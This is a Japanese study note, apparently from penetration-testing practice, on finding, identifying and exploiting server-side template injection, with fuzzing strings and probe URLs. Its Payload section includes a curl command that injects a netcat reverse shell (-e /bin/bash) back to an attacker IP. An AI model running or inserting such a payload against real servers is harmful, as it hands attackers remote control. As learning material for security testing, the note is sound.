## ## SSTIの理解
 - SSTIは、SSTIを見つけようとしないと見過ごされやすい脆弱性である。
- 発火は、XSSと同じ文字連結によって引きおこる。

---
## ## SSTIの見つけ方
### ### Step1 : Detect(検出)
 - 特殊文字の列挙(テンプレートファジング)をするのが一般的。
```sh
${{<%[%'"}}%\
```
->注意:SSTIは2つの異なるコンテキストで発生し、どれぞれ独自の検出方法が必要である。

- SSTIの有無の判断基準
	- **プレーンテキストのコンテキストの場合**
		- XSSと同じ方法で見つけることが出来るが、この場合`{{7*7}}`などの演算を入力することにより、戻り値が49となればSSTIがあるという理解でいいだろう。
			※数字演算の場合、使用するテンプレートエンジンによって正しい書式が異なるので注意が必要。
	- **コードコンテキスト**
		- **Step1:XSSサイトでないことの確認が必要**
			```Example
			URL: http://site.com/?greeting=data.username<tag>
			目的: 直接的なXSS脆弱性がないことを確認
			期待結果: <tag>がエスケープされるか、エラーになる
			```
		- **Step2:テンプレート構文からの脱出。**
			```Example
			URL: http://site.com/?greeting=data.username}}<tag>
			目的: テンプレート式から抜け出してHTMLを挿入
			期待結果: もしSSTIがあれば「Hello Carlos<tag>」と表示される
			```

### ### Step2 :  Identify(特定)
SSTIの可能性を検出したら、次はtemplateエンジンを特定すること。
テンプレートエンジンの特定は以下の図のようなペイロードを送ればわかる。
![[Pasted image 20250612224600.png]]
※注意:同じテンプレート言語で成功レスポンスを返す場合があることに注意が必要。
1つのテンプレートで決めつけず複数のペイロードを使用する方がいい。

### ### Step3 :Exploit(悪用)
- **step1:ドキュメントを読む**
	- まずテンプレートエンジンの特定が出来たら、そのドキュメントを読んで理解を深めることから始める。
	- その際に意識することは基本的なテンプレート構文を学ぶこと。
	- セキュリティの影響の箇所を読む。ドキュメントにはセキュリティセクションみたいな箇所が存在する。通常はテンプレートで避けるべき危険な関数に関することだったりが記載されている。
	- オンラインでテンプレートエンジンの脆弱性がないかを探す。
- **Step2:探索**
	- ターゲットのサイトを巡回して、アクセスできるすべてのオブジェクトを見つける。
	- 
--- 
![[Pasted image 20250524180648.png]]
- 上記のような{}が出力されているときは、SSTIを疑ってよい


## ## Payload
```
curl -i http://192.168.237.117:50000/verify -X POST --data 'code=5*5'
curl -i http://192.168.243.117:50000/verify -X POST --data 'code=os.system("nc 192.168.45.154 18000 -e /bin/bash")'
```
※参考サイト
[https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys);

---
## ## Enumeration
### ### wordbruteforce
```sh
ffuf 
```

